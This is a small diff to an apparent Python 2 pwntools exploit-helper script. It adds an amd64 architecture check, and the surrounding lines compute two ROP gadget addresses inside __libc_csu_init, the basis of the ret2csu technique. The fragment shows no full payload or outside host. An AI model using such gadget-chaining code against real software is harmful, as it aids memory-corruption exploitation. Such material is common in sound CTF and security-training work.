@@ -15,6 +15,10 @@ if len(sys.argv) > 2:
 
 binary = ELF(sys.argv[1])
 
+if binary.arch != "amd64":
+    print "error: the binary arch must be amd64"
+    exit(1)
+
 gadget1 = binary.symbols["__libc_csu_init"] + (0x4005EA - 0x400590)
 gadget2 = binary.symbols["__libc_csu_init"] + (0x4005D0 - 0x400590)
 
